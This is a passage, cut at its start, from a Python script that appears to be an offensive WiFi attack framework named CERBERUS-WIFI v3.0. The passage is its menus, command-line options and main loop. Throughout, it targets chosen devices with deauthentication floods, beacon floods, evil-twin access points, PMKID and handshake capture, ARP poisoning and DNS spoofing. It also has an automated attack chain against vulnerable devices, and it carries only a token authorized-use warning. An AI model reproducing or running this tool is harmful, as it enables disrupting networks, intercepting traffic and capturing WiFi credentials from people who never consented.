{Colors.RED}{Colors.BOLD}ATTACK MENU{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
1. Deauth Attack
2. Beacon Flood
3. Evil Twin Attack
4. PMKID Capture
5. Handshake Capture
6. ARP Poisoning
7. DNS Spoofing
8. Full Attack Chain
""")
        choice = input(f"{Colors.CYAN}[>] Select attack: {Colors.WHITE}").strip()
        
        if choice == '1':
            mac = input("[>] Target MAC: ").strip().upper()
            count = int(input("[>] Packet count (100): ").strip() or "100")
            self.attack_queue.put({'method': 'deauth', 'target': mac, 'count': count})
        elif choice == '2':
            bssid = input("[>] Target BSSID: ").strip().upper()
            count = int(input("[>] Packet count (1000): ").strip() or "1000")
            self.attack_queue.put({'method': 'beacon_flood', 'target': bssid, 'count': count})
        elif choice == '3':
            bssid = input("[>] Target BSSID: ").strip().upper()
            ssid = input("[>] SSID: ").strip()
            self.attack_queue.put({'method': 'evil_twin', 'target': bssid, 'ssid': ssid})
        elif choice == '4':
            bssid = input("[>] Target BSSID: ").strip().upper()
            self.attack_queue.put({'method': 'pmkid_capture', 'target': bssid})
        elif choice == '5':
            bssid = input("[>] Target BSSID: ").strip().upper()
            self.attack_queue.put({'method': 'handshake_capture', 'target': bssid})
        elif choice == '6':
            target_ip = input("[>] Target IP: ").strip()
            gateway = input("[>] Gateway IP: ").strip()
            self.attack_queue.put({'method': 'arp_poison', 'target': target_ip, 'gateway': gateway})
        elif choice == '7':
            target_ip = input("[>] Target IP: ").strip()
            domain = input("[>] Domain to spoof: ").strip()
            redirect = input("[>] Redirect IP: ").strip()
            self.attack_queue.put({'method': 'dns_spoof', 'target': target_ip, 'domain': domain, 'redirect': redirect})
        elif choice == '8':
            self._full_attack_chain()
        else:
            cprint("[-] Invalid selection", Colors.RED)
    
    def _full_attack_chain(self):
        cprint("[FULL] Executing full attack chain", Colors.RED, bold=True)
        
        # 1. Scan for targets
        cprint("[*] Scanning for targets...", Colors.BLUE)
        time.sleep(2)
        
        # 2. Identify vulnerable devices
        vulnerable = []
        with self.lock:
            for mac, info in self.devices.items():
                if info.vulnerabilities and not info.banned and not info.trusted:
                    vulnerable.append(mac)
        
        if not vulnerable:
            cprint("[!] No vulnerable devices found", Colors.YELLOW)
            return
        
        # 3. Attack each vulnerable device
        for mac in vulnerable[:5]:
            cprint(f"[*] Attacking {mac}", Colors.BLUE)
            self.attack_queue.put({'method': 'deauth', 'target': mac, 'count': 100})
            self.attack_queue.put({'method': 'pmkid_capture', 'target': mac})
            time.sleep(0.5)
        
        cprint("[+] Full attack chain executed", Colors.GREEN)
    
    def run_menu(self):
        while self.running:
            print(f"\n{Colors.BLUE}{'='*60}{Colors.WHITE}")
            print(f"{Colors.BOLD}CERBERUS-WIFI v{VERSION} - WiFi Domination Menu{Colors.WHITE}")
            print(f"{Colors.BLUE}{'='*60}{Colors.WHITE}")
            print("1. List All Devices")
            print("2. Show Device Details")
            print("3. Ban Device (Continuous Deauth)")
            print("4. Unban Device")
            print("5. Trust Device")
            print("6. Show Access Points")
            print("7. Show Statistics")
            print("8. Attack Menu")
            print("9. Exit")
            
            choice = input(f"\n{Colors.CYAN}[>] Select (1-9): {Colors.WHITE}").strip()
            
            if choice == '1':
                self.list_devices()
            elif choice == '2':
                mac = input("[>] MAC Address: ").strip().upper()
                self.show_device_info(mac)
            elif choice == '3':
                mac = input("[>] MAC Address to ban: ").strip().upper()
                self.ban_device(mac)
            elif choice == '4':
                mac = input("[>] MAC Address to unban: ").strip().upper()
                self.unban_device(mac)
            elif choice == '5':
                mac = input("[>] MAC Address to trust: ").strip().upper()
                self.trust_device(mac)
            elif choice == '6':
                self.show_aps()
            elif choice == '7':
                self.show_stats()
            elif choice == '8':
                self.attack_menu()
            elif choice == '9':
                cprint("[*] Exiting...", Colors.GREEN)
                self.running = False
                self.stop_event.set()
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ============================[ MAIN FRAMEWORK ]================================
class CerberusWiFi:
    """Ultimate WiFi Domination Framework"""
    
    def __init__(self, interface: str = "wlan0"):
        self.engine = WiFiDominationEngine(interface)
        self.results = []
        self.running = True
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down CERBERUS-WIFI...", Colors.RED)
        self.engine.running = False
        self.engine.stop_event.set()
        self.running = False
        sys.exit(0)
    
    def run(self):
        print_banner()
        cprint("[*] CERBERUS-WIFI v3.0 - Ultimate WiFi Domination Framework", Colors.CYAN)
        cprint("[*] APT Grade | Zero Trace | Full Spectrum Attack | Military Grade", Colors.DIM)
        cprint("[!] WARNING: This tool is for authorized security testing only", Colors.RED)
        cprint("[!] You are fully accountable for your actions", Colors.RED)
        
        cprint("[*] Starting WiFi scanning...", Colors.BLUE)
        cprint("[*] Press Ctrl+C to stop scanning\n", Colors.DIM)
        
        scan_thread = threading.Thread(target=self.engine.start_scanning, daemon=True)
        scan_thread.start()
        time.sleep(2)
        
        try:
            self.engine.run_menu()
        except KeyboardInterrupt:
            self.engine.running = False
            self.engine.stop_event.set()
            cprint("\n[!] Shutting down...", Colors.YELLOW)
            sys.exit(0)

# ============================[ MAIN ]================================
def main():
    parser = argparse.ArgumentParser(
        description="CERBERUS-WIFI v3.0 - Ultimate WiFi Domination Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  sudo python3 cerberus_wifi_v3.py -i wlan0
  sudo python3 cerberus_wifi_v3.py -i wlan0 --ban 00:11:22:33:44:55
  sudo python3 cerberus_wifi_v3.py -i wlan0 --list
  sudo python3 cerberus_wifi_v3.py -i wlan0 --deauth 00:11:22:33:44:55 --count 200
  sudo python3 cerberus_wifi_v3.py -i wlan0 --attack-chain
        """
    )
    
    parser.add_argument("-i", "--interface", default="wlan0", help="Wireless interface")
    parser.add_argument("--ban", help="Ban a device by MAC address")
    parser.add_argument("--unban", help="Unban a device by MAC address")
    parser.add_argument("--trust", help="Trust a device by MAC address")
    parser.add_argument("--list", action="store_true", help="List all devices")
    parser.add_argument("--deauth", help="Send deauth to a device (MAC)")
    parser.add_argument("--count", type=int, default=100, help="Number of deauth packets")
    parser.add_argument("--attack-chain", action="store_true", help="Execute full attack chain")
    parser.add_argument("--evil-twin", help="Create evil twin AP (BSSID)")
    parser.add_argument("--ssid", help="SSID for evil twin")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    if not SCAPY_AVAILABLE:
        cprint("[!] Scapy not installed. Run: pip3 install scapy", Colors.RED)
        sys.exit(1)
    
    print_banner()
    
    engine = WiFiDominationEngine(args.interface)
    
    if args.ban:
        engine.ban_device(args.ban.upper())
        sys.exit(0)
    
    if args.unban:
        engine.unban_device(args.unban.upper())
        sys.exit(0)
    
    if args.trust:
        engine.trust_device(args.trust.upper())
        sys.exit(0)
    
    if args.list:
        cprint("[*] Scanning for 10 seconds...", Colors.BLUE)
        scan_thread = threading.Thread(target=engine.start_scanning, daemon=True)
        scan_thread.start()
        time.sleep(10)
        engine.stop_event.set()
        engine.list_devices()
        sys.exit(0)
    
    if args.deauth:
        engine.attack_queue.put({
            'method': 'deauth',
            'target': args.deauth.upper(),
            'count': args.count
        })
        time.sleep(2)
        sys.exit(0)
    
    if args.attack_chain:
        cprint("[*] Executing full attack chain...", Colors.RED, bold=True)
        
        # Start scanning
        scan_thread = threading.Thread(target=engine.start_scanning, daemon=True)
        scan_thread.start()
        time.sleep(5)
        
        # Find vulnerable devices
        vulnerable = []
        with engine.lock:
            for mac, info in engine.devices.items():
                if info.vulnerabilities and not info.banned and not info.trusted:
                    vulnerable.append(mac)
        
        if not vulnerable:
            cprint("[!] No vulnerable devices found", Colors.YELLOW)
            sys.exit(1)
        
        # Attack each vulnerable device
        for mac in vulnerable[:5]:
            engine.attack_queue.put({'method': 'deauth', 'target': mac, 'count': 100})
            engine.attack_queue.put({'method': 'pmkid_capture', 'target': mac})
            cprint(f"[+] Attacking {mac}", Colors.GREEN)
            time.sleep(0.5)
        
        time.sleep(2)
        engine.stop_event.set()
        engine.list_devices()
        sys.exit(0)
    
    if args.evil_twin:
        ssid = args.ssid or f"FreeWiFi_{random.randint(1000,9999)}"
        engine.attack_queue.put({
            'method': 'evil_twin',
            'target': args.evil_twin.upper(),
            'ssid': ssid
        })
        time.sleep(2)
        sys.exit(0)
    
    # Interactive mode
    tool = CerberusWiFi(args.interface)
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[!] Error: {e}", Colors.RED)
        import traceback
        traceback.print_exc()
        sys.exit(1)
